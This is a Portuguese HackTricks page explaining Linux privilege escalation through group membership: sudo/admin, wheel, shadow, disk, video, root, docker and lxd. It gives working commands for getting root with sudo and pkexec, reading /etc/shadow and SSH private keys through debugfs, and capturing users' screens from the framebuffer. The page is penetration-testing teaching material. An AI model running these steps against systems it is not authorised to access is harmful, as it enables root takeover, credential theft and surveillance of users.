<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Grupos Sudo/Admin

## **PE - Método 1**

**Às vezes**, **por padrão \(ou porque algum software necessita\)** dentro do arquivo **/etc/sudoers** você pode encontrar algumas destas linhas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Isso significa que **qualquer usuário que pertença ao grupo sudo ou admin pode executar qualquer coisa como sudo**.

Se for esse o caso, para **se tornar root você pode simplesmente executar**:
```text
sudo su
```
## PE - Método 2

Encontre todos os binários suid e verifique se existe o binário **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
```markdown
Se você descobrir que o binário pkexec é um binário SUID e você pertence ao grupo sudo ou admin, você provavelmente poderá executar binários como sudo usando pkexec.
Verifique o conteúdo de:
```
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lá você encontrará quais grupos têm permissão para executar **pkexec** e **por padrão** em alguns linux podem **aparecer** alguns dos grupos **sudo ou admin**.

Para **se tornar root você pode executar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se você tentar executar **pkexec** e receber este **erro**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Não é porque você não tem permissões, mas sim porque você não está conectado sem uma GUI**. E há uma solução alternativa para este problema aqui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Você precisa de **2 sessões ssh diferentes**:

{% code title="sessão1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
```
{% endcode %}

{% code title="session2" %}
```
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Grupo Wheel

**Às vezes**, **por padrão** dentro do arquivo **/etc/sudoers** você pode encontrar esta linha:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Isso significa que **qualquer usuário que pertença ao grupo wheel pode executar qualquer coisa como sudo**.

Se for o caso, para **se tornar root você pode simplesmente executar**:
```text
sudo su
```
# Grupo Shadow

Usuários do **grupo shadow** podem **ler** o arquivo **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Então, leia o arquivo e tente **quebrar alguns hashes**.

# Grupo de Disco

Este privilégio é quase **equivalente ao acesso root** pois você pode acessar todos os dados dentro da máquina.

Arquivos: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Observe que usando debugfs você também pode **escrever arquivos**. Por exemplo, para copiar `/tmp/asd1.txt` para `/tmp/asd2.txt` você pode fazer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
No entanto, se você tentar **escrever arquivos de propriedade do root** \(como `/etc/shadow` ou `/etc/passwd`\), você terá um erro de "**Permission denied**".

# Grupo de Vídeo

Usando o comando `w`, você pode descobrir **quem está logado no sistema** e ele mostrará uma saída como a seguinte:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
O **tty1** indica que o usuário **yossi está fisicamente logado** em um terminal na máquina.

O **grupo video** tem acesso para visualizar a saída da tela. Basicamente, você pode observar as telas. Para fazer isso, você precisa **capturar a imagem atual na tela** em dados brutos e obter a resolução que a tela está usando. Os dados da tela podem ser salvos em `/dev/fb0` e você pode encontrar a resolução desta tela em `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** a **imagem raw**, você pode usar o **GIMP**, selecione o arquivo **`screen.raw`** e escolha como tipo de arquivo **Dados de imagem raw**:

![](../../.gitbook/assets/image%20%28208%29.png)

Em seguida, modifique a Largura e Altura para as usadas na tela e verifique diferentes Tipos de Imagem \(e selecione o que mostra melhor a tela\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Grupo Root

Parece que, por padrão, **membros do grupo root** podem ter acesso para **modificar** alguns arquivos de configuração de **serviços**, arquivos de **bibliotecas** ou **outras coisas interessantes** que poderiam ser usadas para escalar privilégios...

**Verifique quais arquivos os membros do root podem modificar**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Grupo Docker

Você pode montar o sistema de arquivos raiz da máquina host em um volume de instância, então, quando a instância inicia, ela imediatamente carrega um `chroot` naquele volume. Isso efetivamente lhe dá root na máquina.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Grupo lxc/lxd

[lxc - Escalação de Privilégio](lxd-privilege-escalation.md)



<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
